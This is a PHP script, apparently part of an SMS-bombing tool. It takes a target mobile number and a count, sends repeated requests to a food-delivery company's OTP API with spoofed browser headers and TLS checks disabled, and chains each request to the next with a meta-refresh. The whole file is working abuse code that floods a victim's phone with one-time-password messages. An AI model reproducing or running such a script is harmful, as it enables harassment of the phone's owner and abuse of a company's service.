<?php 
$count=$_REQUEST['count'];
$sent=$_REQUEST['sent'];
$mobno=$_REQUEST['mobno'];
if($sent==$count){	
	header("location:index.php?msg=total ".$count." otp send successuffly");
}
else{ 
	
 $data='{"mobile":"'.$mobno.'","clientSource":10,"brand_id":10,"dialing_code":"+91","country_code":"IND"}';
 $url="https://api.faasos.io/v1/otp_mobile.json";
         //header here
        $headers   = array();
        $headers[] = "Host:api.faasos.io";
        $headers[] = "content-length:97";
        $headers[] = "accept:application/json, text/plain, */*";
        $headers[] = "custom-origin:WebApp-OS-React";
        $headers[] = "brand-id:10";
        $headers[] = "brand-id:10";
        $headers[] = "content-type:application/json;charset=UTF-8";
        $headers[] = "user-agent:Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36";
        $headers[] = "client-source:10";
        $headers[] = "client-os:WebApp-Ovenstory";
        $headers[] = "origin:https://www.ovenstory.in";
        $headers[] = "Sec-Fetch-Site:same-site";
        $headers[] = "Sec-Fetch-Mode:cors";
        $headers[] = "Sec-Fetch-Dest:empty";
        $headers[] = "referer:https://www.ovenstory.in/";
        $headers[] = "Accept-Encoding:gzip, deflate, br";
        $headers[] = "Accept-Language:en-US,en;q=0.9";

        //end headers and function start
         $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $result = curl_exec($ch);
        curl_close($ch);
    

	$sentinc=$sent+1;
   $rl="22.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno;
   ?><center><div style="height: 50px;width: 40rem;border-radius:20px;background:#00F306;color: black;font-size: 32px;border:2px dotted red;padding-top: 8px;font-family: Yu Gothic;"> <?php echo $sent; ?> OTP SEND AND CONTINUE....</div></center><?php
	echo '<META HTTP-EQUIV=REFRESH CONTENT="2; '.$rl.'">';
	//header("location:2.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno);
}
?>
